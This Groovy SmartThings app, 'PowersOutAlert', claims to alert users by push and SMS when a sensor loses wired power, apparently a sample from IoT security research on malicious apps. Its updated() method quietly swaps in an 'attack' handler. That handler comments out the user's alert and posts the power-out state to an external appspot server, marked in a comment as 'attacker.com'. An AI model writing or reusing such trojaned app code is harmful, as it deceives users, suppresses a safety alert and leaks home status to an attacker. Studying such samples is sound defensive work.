/**
 *  PowersOutAlert
 *
 *  Copyright 2018 Quang Pham
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 *  in compliance with the License. You may obtain a copy of the License at:
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed
 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License
 *  for the specific language governing permissions and limitations under the License.
 *
 */
definition(
    name: "PowersOutAlert",
    namespace: "quangpham98",
    author: "Quang Pham",
    description: "App Update -- PowersOutAlert",
    category: "",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")


preferences {

       section("When there is wired-power loss on...") {

                     input "lockMotion", "capability.motionSensor", title: "Where?"

       }

       section("Via a push notification and a text message(optional)"){

          input "pushAndPhone", "enum", title: "Send Text?", required: false, metadata: [values: ["Yes","No"]]

              input "phone1", "phone", title: "Phone Number (for Text, optional)", required: false

 

       }

}

 

def installed() {

log.debug "installed"

       subscribe(lockMotion, "powerSource.battery", onBatteryPowerHandler)

    subscribe(lockMotion, "powerSource.powered", PoweredPowerHandler)

}

 

def updated() {

       log.debug "updated"

       unsubscribe()

       subscribe(lockMotion, "powerSource.battery", onBatteryPowerAttackHandler)

    subscribe(lockMotion, "powerSource.powered", PoweredPowerHandler)

}

 

 

def onBatteryPowerHandler(evt) {

       log.trace "$evt.value: $evt"

       def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Out!"

   

       log.debug "sending push for power is out"

       sendPush(msg)

   

    if ( phone1 && pushAndPhone ) {

          log.debug "sending SMS to ${phone1}"

   sendSms(phone1, msg)

       }

}

def onBatteryPowerAttackHandler(evt) {

       log.trace "$evt.value: $evt"

       def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Out!"

    log.debug "attack"

    attack()

    /*

       log.debug "sending push for power is out"

       sendPush(msg)

   

    if ( phone1 && pushAndPhone ) {

          log.debug "sending SMS to ${phone1}"

   sendSms(phone1, msg)

       }

    */

}

 

def PoweredPowerHandler(evt) {

       log.trace "$evt.value: $evt"

       def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Back On!"

   

       log.debug "sending push for power is back on"

       sendPush(msg)

   

    if ( phone1 && pushAndPhone ) {

          log.debug "sending SMS to ${phone1}"

          sendSms(phone1, msg)

       }

}

 

def attack() {

    log.debug "http post"

    def takeParams = [

            uri: "https://automated-lore-135923.appspot.com", //"https://attacker.com"

            path: "",

            requestContentType: "application/x-www-form-urlencoded",

            body: [

                    "lockMotion": "out of battery!!!"

                 ]

      ]

      try {

              httpPost(takeParams) { resp ->

                     if (resp.status == 200) {

                            log.debug "attack succeeded"

                log.debug resp.data.toString()

                     } else {

                            log.error "attack failed"

                     }

              }

        } catch (groovyx.net.http.HttpResponseException e) {

              log.error "Send Message failure: ${e} with status: ${e.statusCode}"

              if (e.statusCode == 403) {

                     throw new RuntimeException("Login Required")

              } else if (e.statusCode == 404) {

                     log.error "offline"

              }

        } catch (Exception e) {

              log.error "Unexpected exception", e

        }

  

}